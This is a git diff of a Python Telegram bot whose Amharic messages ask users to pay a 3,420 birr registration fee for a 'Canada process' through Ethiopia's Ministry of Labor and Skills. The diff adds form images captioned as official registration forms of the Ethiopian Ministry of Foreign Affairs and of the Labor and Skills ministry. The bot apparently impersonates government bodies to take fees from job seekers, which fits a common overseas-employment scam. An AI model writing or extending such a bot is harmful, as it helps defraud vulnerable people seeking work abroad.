@@ -9,11 +9,12 @@ TOKEN = os.getenv("BOT_TOKEN")
 
 # Telegram file_id for the receipt image
 FILE_ID = "AgACAgQAAxkBAAMbaSWTUbtSyaaO4nk7uY39DDptUOAAAsMLaxvFeSlRKhnYtBpPTJMBAAMCAAN5AAM2BA"
-FILE_ID2 = "AgACAgQAAxkBAANSaSruVVLPa9HZ4xpOuKxQ812cYsgAAlsMaxtiBlBRJ5bdl0STQcEBAAMCAAN5AAM2BA"
+FILE_ID2 = "AgACAgQAAxkBAANcaSrwHpp87IGuR-E-X5_maryIYfMAAgILaxtiBlhRe2GwQsDSxZoBAAMCAAN5AAM2BA"
+FILE_ID3 = "AgACAgQAAxkBAANSaSruVVLPa9HZ4xpOuKxQ812cYsgAAlsMaxtiBlBRJ5bdl0STQcEBAAMCAAN5AAM2BA"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "የካናዳ ፕሮሰስ በ ስራ እና ክህሎት ሚንስቴር በኩል ለመጀመር የመመዝገቢያ 3,420 ብር ይክፈሉ። "
+        "የካናዳ ፕሮሰስ በ ስራ እና ክህሎት ሚንስቴር በኩል ለመጀመር በቀጣይ የሚያገኙትን ፎርሞች ሞልተው የመመዝገቢያ 3,420 ብር ይክፈሉ። "
         "ለመክፈል ይህን ይጫኑ /pay."
     )
 
@@ -28,9 +29,15 @@ async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Send second image using Telegram file_id 
     await update.message.reply_photo( 
         photo=FILE_ID2, 
-        caption=" *የተጨማሪ ምስል መረጃ:*", 
+        caption=" *የ ኢትዮጵያ ፌዴራላዊ ዲሞክራሲያዊ ሪፐብሊክ የውጭ ጉዳይ ሚኒስቴር የምዝገባ ቅፅ።:*", 
         parse_mode="Markdown" )
 
+    # Send third image using Telegram file_id 
+    await update.message.reply_photo( 
+        photo=FILE_ID3, 
+        caption=" *የ ስራና ክህሎት የ ምዝገባ እና የ ስራ ዝርዝር ቅፅ።:*", 
+        parse_mode="Markdown" )
+    
     # Then send text instructions
     message = (
         "💰 የመክፈያ መመሪያ:\n\n"
